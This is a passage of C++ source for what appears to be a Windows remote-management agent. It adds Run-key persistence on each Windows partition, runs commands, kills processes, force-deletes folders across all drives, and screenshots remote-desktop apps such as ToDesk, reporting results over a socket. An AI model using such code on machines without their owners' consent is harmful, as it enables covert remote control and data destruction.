            if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, wFullRunKey.c_str(),
                0, NULL, REG_OPTION_NON_VOLATILE,
                KEY_SET_VALUE | KEY_WOW64_64KEY,
                NULL, &hRun, NULL) == ERROR_SUCCESS) {
                if (add) {
                    wstring wVal = wTargetExePath;
                    RegSetValueExW(hRun, valueName, 0, REG_SZ,
                        (LPBYTE)wVal.c_str(),
                        (DWORD)((wVal.size() + 1) * sizeof(wchar_t)));
                    char okMsg[128];
                    sprintf_s(okMsg, "OK|%c盘 启动项已添加|%s",
                        letter, cpuTag.c_str());
                    result += string(okMsg) + "\r\n";
                }
                else {
                    RegDeleteValueW(hRun, valueName);
                    char okMsg[128];
                    sprintf_s(okMsg, "OK|%c盘 启动项已删除|%s",
                        letter, cpuTag.c_str());
                    result += string(okMsg) + "\r\n";
                }
                RegCloseKey(hRun);
            }
            else {
                char errMsg[128];
                sprintf_s(errMsg, "ERROR|%c盘 打开Run键失败|%s",
                    letter, cpuTag.c_str());
                result += string(errMsg) + "\r\n";
            }

            RegUnLoadKeyW(HKEY_LOCAL_MACHINE, wTempKey.c_str());
        }
    }

    if (!foundAny)
        result = "ERROR|未找到任何Windows系统分区|" + cpuTag;

    // ★ 恢复WOW64文件系统重定向
    Wow64RevertWow64FsRedirection(oldFsRedirection);

    return result;
}

// ===== 运行程序 =====
string RunProgram(const string& cmdLineUtf8)
{
    string cpuTag;
    { wchar_t h[256] = {}; DWORD l = 256;
    if (GetComputerNameW(h, &l)) cpuTag = WideToUtf8(wstring(h)); }

    if (cmdLineUtf8.empty())
        return "ERROR|参数为空|" + cpuTag;

    // 分离可执行文件路径和参数
    // 支持两种格式：
    //   带引号：  "C:\Program Files\app.exe" /S
    //   不带引号：C:\app.exe /S
    wstring wCmdLine = Utf8ToWide(cmdLineUtf8);

    wstring wExePath, wArgs;
    if (!wCmdLine.empty() && wCmdLine[0] == L'"') {
        // 带引号，找结束引号
        size_t endQuote = wCmdLine.find(L'"', 1);
        if (endQuote != wstring::npos) {
            wExePath = wCmdLine.substr(1, endQuote - 1);
            wArgs = (endQuote + 1 < wCmdLine.size())
                ? wCmdLine.substr(endQuote + 1) : L"";
            // 去掉args前导空格
            while (!wArgs.empty() && wArgs[0] == L' ') wArgs = wArgs.substr(1);
        }
        else {
            wExePath = wCmdLine;
        }
    }
    else {
        // ★ 不带引号：先检查整个字符串是否是完整路径（处理路径含空格的情况）
        if (GetFileAttributesW(wCmdLine.c_str()) != INVALID_FILE_ATTRIBUTES) {
            // 整个字符串就是完整路径，不含参数
            wExePath = wCmdLine;
        }
        else {
            // 从后往前找空格，逐步尝试哪段是有效路径
            wstring candidate = wCmdLine;
            wstring argsCandidate;
            bool found = false;
            size_t spacePos = wCmdLine.rfind(L' ');
            while (spacePos != wstring::npos) {
                candidate = wCmdLine.substr(0, spacePos);
                argsCandidate = wCmdLine.substr(spacePos + 1);
                if (GetFileAttributesW(candidate.c_str()) != INVALID_FILE_ATTRIBUTES) {
                    found = true;
                    break;
                }
                if (spacePos == 0) break;
                spacePos = wCmdLine.rfind(L' ', spacePos - 1);
            }
            if (found) {
                wExePath = candidate;
                wArgs = argsCandidate;
                while (!wArgs.empty() && wArgs[0] == L' ') wArgs = wArgs.substr(1);
            }
            else {
                // 找不到有效路径，按第一个空格分割（原来的逻辑）
                spacePos = wCmdLine.find(L' ');
                if (spacePos != wstring::npos) {
                    wExePath = wCmdLine.substr(0, spacePos);
                    wArgs = wCmdLine.substr(spacePos + 1);
                    while (!wArgs.empty() && wArgs[0] == L' ') wArgs = wArgs.substr(1);
                }
                else {
                    wExePath = wCmdLine;
                }
            }
        }
    }

    // 组装完整命令行
    wstring wFullCmd;
    if (wArgs.empty())
        wFullCmd = L"\"" + wExePath + L"\"";
    else
        wFullCmd = L"\"" + wExePath + L"\" " + wArgs;

    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOWNORMAL;
    PROCESS_INFORMATION pi = {};

    // ★ 先尝试 CreateProcess（exe直接启动），失败则用 ShellExecute（关联程序打开）
    BOOL launched = CreateProcessW(
        wExePath.c_str(),
        &wFullCmd[0],
        NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

    if (launched) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    else {
        // ★ exe启动失败或非exe文件，用ShellExecuteW用关联程序打开
        // 参数不为空时用 ShellExecute 也能带参数
        HINSTANCE hInst = ShellExecuteW(
            NULL, L"open",
            wExePath.c_str(),
            wArgs.empty() ? NULL : wArgs.c_str(),
            NULL, SW_SHOWNORMAL);

        // ShellExecuteW 返回值大于32表示成功
        if ((INT_PTR)hInst <= 32) {
            DWORD err = GetLastError();
            char errMsg[256];
            sprintf_s(errMsg, "ERROR|启动失败 错误码:%lu|%s", err, cpuTag.c_str());
            return string(errMsg);
        }
    }

    char okMsg[512];
    sprintf_s(okMsg, "OK|已启动: %s|%s",
        WideToUtf8(wExePath).c_str(), cpuTag.c_str());
    return string(okMsg);
}

// ===== 结束进程（支持通配符）=====
// 通配符匹配：* 匹配任意字符，? 匹配单个字符
bool WildcardMatch(const wstring& pattern, const wstring& str)
{
    // 转小写比较
    wstring p = pattern, s = str;
    transform(p.begin(), p.end(), p.begin(), ::tolower);
    transform(s.begin(), s.end(), s.begin(), ::tolower);

    size_t pi = 0, si = 0;
    size_t starPos = wstring::npos, matchPos = 0;

    while (si < s.size()) {
        if (pi < p.size() && (p[pi] == L'?' || p[pi] == s[si])) {
            pi++; si++;
        }
        else if (pi < p.size() && p[pi] == L'*') {
            starPos = pi++;
            matchPos = si;
        }
        else if (starPos != wstring::npos) {
            pi = starPos + 1;
            si = ++matchPos;
        }
        else {
            return false;
        }
    }
    while (pi < p.size() && p[pi] == L'*') pi++;
    return pi == p.size();
}

string KillProcessByPattern(const string& patternListUtf8)
{
    string cpuTag;
    { wchar_t h[256] = {}; DWORD l = 256;
    if (GetComputerNameW(h, &l)) cpuTag = WideToUtf8(wstring(h)); }

    if (patternListUtf8.empty())
        return "ERROR|参数为空|" + cpuTag;

    // 解析逗号分隔的进程名列表
    vector<wstring> patterns;
    {
        string tmp = patternListUtf8;
        size_t pos = 0;
        while ((pos = tmp.find(',')) != string::npos) {
            string part = tmp.substr(0, pos);
            // 去空格
            while (!part.empty() && part.front() == ' ') part = part.substr(1);
            while (!part.empty() && part.back() == ' ') part.pop_back();
            if (!part.empty()) patterns.push_back(Utf8ToWide(part));
            tmp = tmp.substr(pos + 1);
        }
        while (!tmp.empty() && tmp.front() == ' ') tmp = tmp.substr(1);
        while (!tmp.empty() && tmp.back() == ' ') tmp.pop_back();
        if (!tmp.empty()) patterns.push_back(Utf8ToWide(tmp));
    }

    if (patterns.empty())
        return "ERROR|未解析到任何进程名|" + cpuTag;

    string result;

    // 枚举所有进程
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE)
        return "ERROR|无法枚举进程|" + cpuTag;

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);

    // 收集匹配的进程
    struct MatchedProc { DWORD pid; wstring name; };
    vector<MatchedProc> matched;

    if (Process32FirstW(hSnap, &pe)) {
        do {
            wstring procName(pe.szExeFile);
            for (auto& pat : patterns) {
                if (WildcardMatch(pat, procName)) {
                    matched.push_back({ pe.th32ProcessID, procName });
                    break;
                }
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);

    if (matched.empty()) {
        result = "INFO|未找到匹配的进程|" + cpuTag;
        return result;
    }

    // 逐个结束
    for (auto& m : matched) {
        HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, m.pid);
        if (!hProc) {
            DWORD err = GetLastError();
            char errMsg[256];
            sprintf_s(errMsg, "FAIL|%s (PID:%lu) 结束失败 错误码:%lu|%s",
                WideToUtf8(m.name).c_str(), m.pid, err, cpuTag.c_str());
            result += string(errMsg) + "\n";
            continue;
        }
        if (!TerminateProcess(hProc, 0)) {
            DWORD err = GetLastError();
            char errMsg[256];
            sprintf_s(errMsg, "FAIL|%s (PID:%lu) 结束失败 错误码:%lu|%s",
                WideToUtf8(m.name).c_str(), m.pid, err, cpuTag.c_str());
            result += string(errMsg) + "\n";
        }
        else {
            char okMsg[256];
            sprintf_s(okMsg, "OK|%s (PID:%lu) 已结束|%s",
                WideToUtf8(m.name).c_str(), m.pid, cpuTag.c_str());
            result += string(okMsg) + "\n";
        }
        CloseHandle(hProc);
    }

    return result;
}

string DeletePath(const string& pathUtf8)
{
    wstring path = Utf8ToWide(pathUtf8);
    DWORD attr = GetFileAttributesW(path.c_str());

    if (attr == INVALID_FILE_ATTRIBUTES)
        return u8"ERROR:路径不存在:" + pathUtf8;

    bool ok = false;

    // 第一步：普通方式
    if (attr & FILE_ATTRIBUTE_DIRECTORY)
        ok = DeleteDirectory(path);
    else {
        SetFileAttributesW(path.c_str(), FILE_ATTRIBUTE_NORMAL);
        ok = DeleteFileW(path.c_str());
    }

    if (ok) return u8"OK:删除成功:" + pathUtf8;

    // 第二步：失败了用TIHelper兜底
    if (attr & FILE_ATTRIBUTE_DIRECTORY)
        ok = TI_ForceDeleteDir(path);
    else
        ok = TI_ForceDeleteFile(path);

    if (ok)
        return u8"OK:删除成功(TI):" + pathUtf8;
    else
        return u8"ERROR:删除失败:" + pathUtf8;
}

// 遍历所有非只读盘符，删除根目录下指定名称的目录
string DeleteDirOnAllDrives(SOCKET reportSocket, const string& dirNameUtf8)
{
    string cpuTag;
    { wchar_t h[256] = {}; DWORD l = 256; if (GetComputerNameW(h, &l)) cpuTag = WideToUtf8(wstring(h)); }

    auto Report = [&](const string& msg) {
        if (reportSocket != INVALID_SOCKET)
            SendPacketBin(reportSocket, CMD_DEL_DIR_RES,
                vector<char>(msg.begin(), msg.end()));
    };

    if (dirNameUtf8.empty()) {
        Report("ERROR|目录名不能为空|" + cpuTag);
        return "ERROR";
    }

    wstring wDirName = Utf8ToWide(dirNameUtf8);
    int foundCount = 0, deletedCount = 0;

    DWORD drives = GetLogicalDrives();
    // 从 Z 往 A 遍历
    for (int i = 25; i >= 0; i--) {
        if (!(drives & (1 << i))) continue;

        char letter = 'A' + i;
        string rootA = string(1, letter) + ":\\";

        // 跳过只读盘（CD-ROM 等）
        UINT driveType = GetDriveTypeA(rootA.c_str());
        if (driveType == DRIVE_CDROM || driveType == DRIVE_UNKNOWN ||
            driveType == DRIVE_NO_ROOT_DIR)
            continue;

        // 检查目录是否存在
        wstring targetPath = Utf8ToWide(rootA) + wDirName;
        DWORD attr = GetFileAttributesW(targetPath.c_str());
        if (attr == INVALID_FILE_ATTRIBUTES) continue;
        if (!(attr & FILE_ATTRIBUTE_DIRECTORY)) continue;

        foundCount++;
        string foundMsg = "FOUND|" + rootA + dirNameUtf8 + "|" + cpuTag;
        Report(foundMsg);

        // 删除目录
        string delResult = DeletePath(WideToUtf8(targetPath));
        if (delResult.find("OK:") == 0) {
            deletedCount++;
            Report("OK|已删除: " + rootA + dirNameUtf8 + "|" + cpuTag);
        }
        else {
            Report("ERROR|删除失败: " + rootA + dirNameUtf8 +
                " 原因:" + delResult + "|" + cpuTag);
        }
    }

    char finalMsg[512];
    if (foundCount == 0) {
        sprintf_s(finalMsg, "DONE|所有盘符均未找到目录 [%s]|%s",
            dirNameUtf8.c_str(), cpuTag.c_str());
    }
    else {
        sprintf_s(finalMsg, "DONE|共找到 %d 处，成功删除 %d 处|%s",
            foundCount, deletedCount, cpuTag.c_str());
    }
    Report(string(finalMsg));
    return string(finalMsg);
}


// 获取所有逻辑磁盘，返回格式：每行一个盘符 "C:\|磁盘类型|卷标\n"
string ListDrives()
{
    string result;
    DWORD drives = GetLogicalDrives();
    for (char c = 'A'; c <= 'Z'; c++) {
        if (!(drives & (1 << (c - 'A')))) continue;
        string root = string(1, c) + ":\\";
        UINT type = GetDriveTypeA(root.c_str());
        string typeStr;
        switch (type) {
        case DRIVE_FIXED:    typeStr = "本地磁盘"; break;
        case DRIVE_REMOVABLE:typeStr = "可移动磁盘"; break;
        case DRIVE_REMOTE:   typeStr = "网络磁盘"; break;
        case DRIVE_CDROM:    typeStr = "光驱"; break;
        case DRIVE_RAMDISK:  typeStr = "RAM磁盘"; break;
        default:             typeStr = "未知"; break;
        }
        // 获取卷标
        wchar_t volName[256] = {};
        wstring wroot = Utf8ToWide(root);
        GetVolumeInformationW(wroot.c_str(), volName, 256, NULL, NULL, NULL, NULL, 0);
        string label = WideToUtf8(wstring(volName));
        result += root + "|" + typeStr + "|" + label + "\n";
    }
    return result;
}

// ===== 获取目录列表 =====
string ListDirectory(const string& dirPathUtf8)
{
    wstring dirPath = Utf8ToWide(dirPathUtf8);

    wstring searchPath = dirPath;
    if (searchPath.back() != L'\\')
        searchPath += L"\\";

    searchPath += L"*";

    string result;

    WIN32_FIND_DATAW ffd;
    HANDLE hFind = FindFirstFileW(searchPath.c_str(), &ffd);

    if (hFind == INVALID_HANDLE_VALUE)
        return "ERROR:无法打开目录:" + dirPathUtf8;

    do
    {
        wstring name = ffd.cFileName;

        if (name == L"." || name == L"..")
            continue;

        bool isDir = (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0;

        ULARGE_INTEGER fileSize;
        fileSize.HighPart = ffd.nFileSizeHigh;
        fileSize.LowPart = ffd.nFileSizeLow;

        SYSTEMTIME st;
        FileTimeToSystemTime(&ffd.ftLastWriteTime, &st);

        char timeBuf[32];
        sprintf_s(timeBuf, "%04d-%02d-%02d %02d:%02d",
            st.wYear, st.wMonth, st.wDay,
            st.wHour, st.wMinute);

        string nameUtf8 = WideToUtf8(name);

        char line[1024];

        if (isDir)
            sprintf_s(line, "D|%s|0|%s\n", nameUtf8.c_str(), timeBuf);
        else
            sprintf_s(line, "F|%s|%llu|%s\n", nameUtf8.c_str(), fileSize.QuadPart, timeBuf);

        result += line;

    } while (FindNextFileW(hFind, &ffd));

    FindClose(hFind);

    return result;
}

// ===== 截图相关 =====

vector<DWORD> FindProcessByName(const wstring& name)
{
    vector<DWORD> pids;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return pids;
    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, name.c_str()) == 0)
                pids.push_back(pe.th32ProcessID);
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return pids;
}

HWND FindProcessWindow(DWORD pid)
{
    struct EnumData { DWORD pid; HWND hwnd; };
    EnumData data = { pid, NULL };
    EnumWindows([](HWND hwnd, LPARAM lParam) -> BOOL {
        EnumData* p = (EnumData*)lParam;
        DWORD winpid = 0;
        GetWindowThreadProcessId(hwnd, &winpid);
        if (winpid == p->pid && IsWindowVisible(hwnd) && GetParent(hwnd) == NULL) {
            p->hwnd = hwnd;
            return FALSE;
        }
        return TRUE;
        }, (LPARAM)&data);
    return data.hwnd;
}

// 获取当前时间戳字符串，格式：20260302200705
// 在 GetTimestamp() 函数里，确保缓冲区清零
string GetTimestamp() {
    SYSTEMTIME st;
    GetLocalTime(&st);
    char buf[32] = { 0 }; // ← 关键：初始化为0，防止垃圾数据
    sprintf_s(buf, "%04d%02d%02d%02d%02d%02d",
        st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
    return string(buf); // string 会自动找 \0，但如果 buf 里有乱码 \0 就糟了
}

// 获取GDI+编码器CLSID
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
{
    UINT num = 0, size = 0;
    GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;

    ImageCodecInfo* pInfo = (ImageCodecInfo*)malloc(size);
    if (!pInfo) return -1;
    GetImageEncoders(num, size, pInfo);

    for (UINT i = 0; i < num; i++) {
        if (wcscmp(pInfo[i].MimeType, format) == 0) {
            *pClsid = pInfo[i].Clsid;
            free(pInfo);
            return i;
        }
    }
    free(pInfo);
    return -1;
}

// 截图并保存为JPG
bool CaptureHwndToFile(HWND hwnd, const wstring& savePath)
{
    int x = 0, y = 0, width, height;
    if (hwnd == NULL) {
        // 全屏，用物理分辨率防止DPI缩放导致截图不全
        GetPhysicalScreenSize(width, height);
    }
    else {
        RECT rect;
        GetWindowRect(hwnd, &rect);
        x = rect.left;
        y = rect.top;
        width = rect.right - rect.left;
        height = rect.bottom - rect.top;
        if (width <= 0 || height <= 0) return false;
    }

    HDC hScreen = GetDC(NULL);
    HDC hMem = CreateCompatibleDC(hScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, width, height);
    SelectObject(hMem, hBitmap);

    // ★ 优先用PrintWindow抓窗口真实内容（绕过DWM层级问题）
    // PW_RENDERFULLCONTENT=2，能抓到DWM合成层的完整内容，不受遮挡影响
    BOOL pwOk = FALSE;
    if (hwnd != NULL) {
        // ★ 先尝试 flag=2（Win8.1+专用）
        pwOk = PrintWindow(hwnd, hMem, 2);

        // ★ 验证是否全黑
        if (pwOk) {
            bool allBlack = true;
            for (int sx : {width / 4, width / 2, width * 3 / 4}) {
                for (int sy : {height / 4, height / 2, height * 3 / 4}) {
                    if (GetPixel(hMem, sx, sy) != RGB(0, 0, 0)) {
                        allBlack = false;
                        break;
                    }
                }
                if (!allBlack) break;
            }
            if (allBlack) pwOk = FALSE;
        }

        // ★ flag=2全黑，降级到flag=0再试
        if (!pwOk) {
            pwOk = PrintWindow(hwnd, hMem, 0);

            // ★ flag=0也验证是否全黑
            if (pwOk) {
                bool allBlack = true;
                for (int sx : {width / 4, width / 2, width * 3 / 4}) {
                    for (int sy : {height / 4, height / 2, height * 3 / 4}) {
                        if (GetPixel(hMem, sx, sy) != RGB(0, 0, 0)) {
                            allBlack = false;
                            break;
                        }
                    }
                    if (!allBlack) break;
                }
                if (allBlack) pwOk = FALSE;
            }
        }

        // ★ PrintWindow全部失败或全黑，用BitBlt
        // Win7下ToDesk内容已合成到屏幕，BitBlt能抓到
        if (!pwOk) {
            BitBlt(hMem, 0, 0, width, height, hScreen, x, y, SRCCOPY);
        }
    }
    else {
        BitBlt(hMem, 0, 0, width, height, hScreen, 0, 0, SRCCOPY);
    }

    Bitmap* bmp = Bitmap::FromHBITMAP(hBitmap, NULL);
    bool ok = false;
    if (bmp) {
        CLSID jpgClsid;
        if (GetEncoderClsid(L"image/jpeg", &jpgClsid) >= 0) {
            EncoderParameters encoderParams;
            encoderParams.Count = 1;
            encoderParams.Parameter[0].Guid = EncoderQuality;
            encoderParams.Parameter[0].Type = EncoderParameterValueTypeLong;
            encoderParams.Parameter[0].NumberOfValues = 1;
            ULONG quality = 30;
            encoderParams.Parameter[0].Value = &quality;
            ok = (bmp->Save(savePath.c_str(), &jpgClsid, &encoderParams) == Ok);
        }
        delete bmp;
    }

    DeleteObject(hBitmap);
    DeleteDC(hMem);
    ReleaseDC(NULL, hScreen);
    return ok;
}

// 获取程序所在目录
wstring GetExeDir()
{
    wchar_t path[MAX_PATH] = {};
    GetModuleFileNameW(NULL, path, MAX_PATH);
    wstring ws(path);
    size_t pos = ws.rfind(L'\\');
    return (pos != wstring::npos) ? ws.substr(0, pos) : ws;
}

// 通过PID获取进程的完整可执行文件路径
wstring GetProcessExePath(DWORD pid)
{
    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (!hProc) return L"";
    wchar_t path[MAX_PATH] = {};
    DWORD size = MAX_PATH;
    // QueryFullProcessImageNameW 在XP以上可用
    if (!QueryFullProcessImageNameW(hProc, 0, path, &size))
    {
        // 降级用GetModuleFileNameExW
        GetModuleFileNameExW(hProc, NULL, path, MAX_PATH);
    }
    CloseHandle(hProc);
    return wstring(path);
}


// 启动指定路径的程序，返回是否成功
bool LaunchProcess(const wstring& exePath)
{
    if (GetFileAttributesW(exePath.c_str()) == INVALID_FILE_ATTRIBUTES) return false;
    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOWNORMAL;
    PROCESS_INFORMATION pi = {};
    if (!CreateProcessW(exePath.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
        return false;
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return true;
}

// 解析 .lnk 快捷方式，获取目标程序路径
wstring ResolveLnkTarget(const wstring& lnkPath)
{
    wstring result;
    IShellLinkW* psl = nullptr;
    IPersistFile* ppf = nullptr;

    if (FAILED(CoInitialize(NULL))) return L"";

    if (SUCCEEDED(CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER,
        IID_IShellLinkW, (void**)&psl)))
    {
        if (SUCCEEDED(psl->QueryInterface(IID_IPersistFile, (void**)&ppf)))
        {
            if (SUCCEEDED(ppf->Load(lnkPath.c_str(), STGM_READ)))
            {
                wchar_t target[MAX_PATH] = {};
                WIN32_FIND_DATAW wfd = {};
                if (SUCCEEDED(psl->GetPath(target, MAX_PATH, &wfd, SLGP_RAWPATH)))
                    result = wstring(target);
            }
            ppf->Release();
        }
        psl->Release();
    }

    CoUninitialize();
    return result;
}

string LaunchAskLink(SOCKET reportSocket, const string& cpuTag)
{
    vector<wstring> lnkCandidates;

    // ===== 辅助 lambda：用 SHGetKnownFolderPath 获取路径，失败返回空 =====
    auto GetKnownFolder = [](const GUID& folderId) -> wstring {
        PWSTR pPath = nullptr;
        wstring result;
        if (SUCCEEDED(SHGetKnownFolderPath(folderId, KF_FLAG_DEFAULT, NULL, &pPath))) {
            result = pPath;
            CoTaskMemFree(pPath);
        }
        return result;
    };

    // FOLDERID_Desktop     = {B4BFCC3A-DB2C-424C-B029-7FE99A87C641}
    // FOLDERID_Programs    = {A77F5D77-2E2B-44C3-A6A2-ABA601054A51}（当前用户开始菜单\Programs）
    // FOLDERID_CommonPrograms = {0139D44E-6AFE-49F2-8690-3DAFCAE6FFB5}（公共开始菜单\Programs）
    static const GUID FOLDERID_Desktop_ = { 0xB4BFCC3A,0xDB2C,0x424C,{0xB0,0x29,0x7F,0xE9,0x9A,0x87,0xC6,0x41} };
    static const GUID FOLDERID_Programs_ = { 0xA77F5D77,0x2E2B,0x44C3,{0xA6,0xA2,0xAB,0xA6,0x01,0x05,0x4A,0x51} };
    static const GUID FOLDERID_CommonPrograms_ = { 0x0139D44E,0x6AFE,0x49F2,{0x86,0x90,0x3D,0xAF,0xCA,0xE6,0xFF,0xB5} };

    // ===== 1. 当前用户桌面（系统变量获取，支持桌面被移到其他盘）=====
    wstring userDesktop = GetKnownFolder(FOLDERID_Desktop_);
    if (!userDesktop.empty())
        lnkCandidates.push_back(userDesktop + L"\\连连控.lnk");

    // PE兜底：SHGetFolderPath（老接口，PE下有时比KnownFolder更可靠）
    {
        wchar_t buf[MAX_PATH] = {};
        if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_DESKTOPDIRECTORY, NULL, SHGFP_TYPE_CURRENT, buf))
            && wcslen(buf) > 0)
        {
            wstring p(buf);
            if (p != userDesktop)  // 避免重复
                lnkCandidates.push_back(p + L"\\连连控.lnk");
        }
    }

    // ===== 2. 公共开始菜单（系统变量获取，支持系统盘不是C盘）=====
    wstring commonPrograms = GetKnownFolder(FOLDERID_CommonPrograms_);
    if (!commonPrograms.empty())
        lnkCandidates.push_back(commonPrograms + L"\\连连控\\连连控.lnk");

    // 当前用户开始菜单（有些软件装在用户级而非公共级）
    wstring userPrograms = GetKnownFolder(FOLDERID_Programs_);
    if (!userPrograms.empty())
        lnkCandidates.push_back(userPrograms + L"\\连连控\\连连控.lnk");

    // PE兜底：CSIDL_COMMON_PROGRAMS
    {
        wchar_t buf[MAX_PATH] = {};
        if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_COMMON_PROGRAMS, NULL, SHGFP_TYPE_CURRENT, buf))
            && wcslen(buf) > 0)
        {
            wstring p(buf);
            if (p != commonPrograms)
                lnkCandidates.push_back(p + L"\\连连控\\连连控.lnk");
        }
    }

    // ===== 遍历候选列表 =====
    for (auto& lnkPath : lnkCandidates)
    {
        if (GetFileAttributesW(lnkPath.c_str()) == INVALID_FILE_ATTRIBUTES)
            continue;
        wstring exePath = ResolveLnkTarget(lnkPath);
        if (exePath.empty())
        {
            continue;
        }
        if (GetFileAttributesW(exePath.c_str()) == INVALID_FILE_ATTRIBUTES)
        {
            continue;
        }
        if (LaunchProcess(exePath))
        {
            string okMsg = "ASKLINK_RUN_OK|连连控.lnk|" + cpuTag;
            if (reportSocket != INVALID_SOCKET)
                SendPacketBin(reportSocket, CMD_DOWNLOAD_PROGRESS,
                    vector<char>(okMsg.begin(), okMsg.end()));
            return "OK";
        }
        else
        {
            string failMsg = "ASKLINK_RUN_FAIL|连连控.lnk|"
                + to_string(GetLastError()) + "|" + cpuTag;
            if (reportSocket != INVALID_SOCKET)
                SendPacketBin(reportSocket, CMD_DOWNLOAD_PROGRESS,
                    vector<char>(failMsg.begin(), failMsg.end()));
            return "FAIL";
        }
    }

    // 所有路径都没找到
    string notFound = "ASKLINK_NOT_FOUND|连连控.lnk|" + cpuTag;
    if (reportSocket != INVALID_SOCKET)
        SendPacketBin(reportSocket, CMD_DOWNLOAD_PROGRESS,
            vector<char>(notFound.begin(), notFound.end()));
    return "NOT_FOUND";
}

// 将窗口置顶并等待重绘
void BringWindowToFrontAndWait(HWND hwnd)
{
    if (IsIconic(hwnd))
        ShowWindow(hwnd, SW_RESTORE);
    else
        ShowWindow(hwnd, SW_SHOWNORMAL);
    SetForegroundWindow(hwnd);
    SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
    Sleep(1500);
    SetWindowPos(hwnd, HWND_NOTOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
}

// ===== 通用远程软件截图框架 =====

// 远程软件配置结构体
// 后续添加新软件只需填写此结构体，不用改任何通用逻辑
struct RemoteAppConfig
{
    // 进程名列表，按优先级排序（精简版在前）
    vector<wstring> processNames;

    // 精简版/绿色版在磁盘上的固定搜索路径列表（按优先级排序）
    // 通用函数会自动在运行时追加"当前用户桌面"路径
    vector<wstring> liteSearchPaths;

    // 截图文件名前缀（生成文件名用）
    string filePrefix;

    // 精简版/绿色版的进程名（用于区分优先级，必须包含在processNames里）
    // 如果没有精简版概念，填空
    wstring liteProcessName;
};

// ===== 以下为通用函数，不含任何软件专属逻辑 =====

// 终止指定进程名列表中的所有进程，等待完全退出（最多5秒）
void KillProcessesByNames(const vector<wstring>& names)
{
    for (auto& name : names) {
        for (auto pid : FindProcessByName(name)) {
            HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
            if (hProc) {
                TerminateProcess(hProc, 0);
                CloseHandle(hProc);
            }
        }
    }
    for (int i = 0; i < 50; i++) {
        Sleep(100);
        bool anyAlive = false;
        for (auto& name : names)
            if (!FindProcessByName(name).empty()) { anyAlive = true; break; }
        if (!anyAlive) break;
    }
}

// 等待指定进程名列表中任意一个出现窗口，最多等15秒
HWND WaitForAppWindow(const vector<wstring>& processNames)
{
    for (int i = 0; i < 30; i++) {
        Sleep(500);
        for (auto& name : processNames) {
            for (auto pid : FindProcessByName(name)) {
                HWND hwnd = FindProcessWindow(pid);
                if (hwnd) return hwnd;
            }
        }
    }
    return NULL;
}

// 通用远程软件截图函数
// 只需传入配置结构体，适用于ToDesk/向日葵/连连控等所有远程软件
wstring CaptureRemoteApp(const RemoteAppConfig& cfg)
{
    // 动态获取当前用户桌面路径，追加到Lite搜索路径
    wchar_t userName[256] = {};
    DWORD userNameLen = 256;
    GetUserNameW(userName, &userNameLen);

    vector<wstring> litePaths = cfg.liteSearchPaths;
    if (!cfg.liteProcessName.empty()) {
        litePaths.push_back(GetSystemDrive() + L"\\Users\\" + userName + L"\\Desktop\\" + cfg.liteProcessName);
        // PE公共桌面兜底
        litePaths.push_back(GetSystemDrive() + L"\\Users\\Public\\Desktop\\" + cfg.liteProcessName);
    }

    // ===== 步骤1：扫描进程 =====
    HWND    hwnd = NULL;
    DWORD   foundPid = 0;
    wstring foundExePath;
    bool    isLiteRunning = false;
    bool    isFullRunning = false;

    // 区分精简版和完整版进程
    vector<DWORD> litePids, fullPids;
    for (auto& name : cfg.processNames) {
        auto pids = FindProcessByName(name);
        if (!pids.empty()) {
            if (name == cfg.liteProcessName)
                litePids.insert(litePids.end(), pids.begin(), pids.end());
            else
                fullPids.insert(fullPids.end(), pids.begin(), pids.end());
        }
    }
    isLiteRunning = !litePids.empty();
    isFullRunning = !fullPids.empty();

    // ===== 步骤2：获取窗口和路径（优先精简版）=====
    if (isLiteRunning) {
        foundPid = litePids[0];
        hwnd = FindProcessWindow(foundPid);
        foundExePath = GetProcessExePath(foundPid);
    }
    else if (isFullRunning) {
        foundPid = fullPids[0];
        hwnd = FindProcessWindow(foundPid);
        foundExePath = GetProcessExePath(foundPid);
    }

    // ===== 步骤3：磁盘有精简版则强制切换 =====
    if (!isLiteRunning && !cfg.liteProcessName.empty())
    {
        wstring availableLitePath;
        for (auto& p : litePaths) {
            if (GetFileAttributesW(p.c_str()) != INVALID_FILE_ATTRIBUTES) {
                availableLitePath = p;
                break;
            }
        }
        if (!availableLitePath.empty()) {
            KillProcessesByNames(cfg.processNames);
            hwnd = NULL;
            foundExePath = availableLitePath;
            goto launch_app;
        }
    }

    // ===== 步骤4：窗口最小化处理 =====
    if (hwnd && IsIconic(hwnd)) {
        KillProcessesByNames(cfg.processNames);
        hwnd = NULL;
        goto launch_app;
    }

